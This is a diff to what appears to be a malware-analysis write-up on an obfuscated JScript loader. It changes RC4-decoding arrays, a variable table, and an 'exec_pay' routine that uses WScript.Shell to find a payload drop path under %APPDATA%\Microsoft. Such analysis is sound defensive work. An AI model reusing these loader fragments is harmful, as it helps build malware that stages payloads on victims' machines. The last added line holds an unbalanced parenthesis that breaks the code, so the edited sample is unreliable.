@@ -580,13 +580,13 @@ function decode_payload(arg, offset1, offset2)
 ```javascript 
 function main() 
 {
- var seq = ["56","48","65","69","66","52","52","70","67","48","52","49","67","65","49","51","56","68","67","50","65","57","49","68","52","65","70","50","67","66"];
- var base_rc4_array = ["215","222","25","139","201","0","105","245","65","151","59","255","225","38","56","210","150","155","102","217","254","187","160","241","186","19","19","145","227","137"];
+ var seq = [56,48,65,69,66,52,52,70,67,48,52,49,67,65,49,51,56,68,67,50,65,57,49,68,52,65,70,50,67,66];
+ var base_rc4_array = [215,222,25,139,201,0,105,245,65,151,59,255,225,38,56,210,150,155,102,217,254,187,160,241,186,19,19,145,227,137];
  var iden_correct = 0;
  var inc = "";
  var lim = 0;
  var tmp_array = [];
- var tab=["98","72","102","109","106","112","83","117","101","117","65","79","115","68","88","116","104","108"];
+ var tab = [98,72,102,109,106,112,83,117,101,117,65,79,115,68,88,116,104,108];
  var index = get_length(tab);
  var i = 0;
  var result_rc4;
@@ -651,7 +651,7 @@ function main()
 |i|200|
 |lim|3|
 |index|18|
-|offset|21|
+|offset_tab|21|
 |tab|[98,72,102,109,106,112,83,117,101,117,65,79,115,68,88,116,104,108,49,57,57]|
 
 <h6>Once this done, this check again for be ensure that the process have been done and launch the second layer.</h6>
@@ -904,7 +904,7 @@ function exec_pay()
     {
         var actxobj = get_actxobj("WScript.Shell");
         tmp_actxobj = actxobj.environment("PROCESS");
-        path_appdata = tmp_actxobj("APPDATA") + "\\Microsoft\\";
+        path_appdata = tmp_actxobj("APPDATA") + "\\Microsoft\\");
         tmp_actxobj = 0;
     }
     catch (e) {path_appdata = "";}
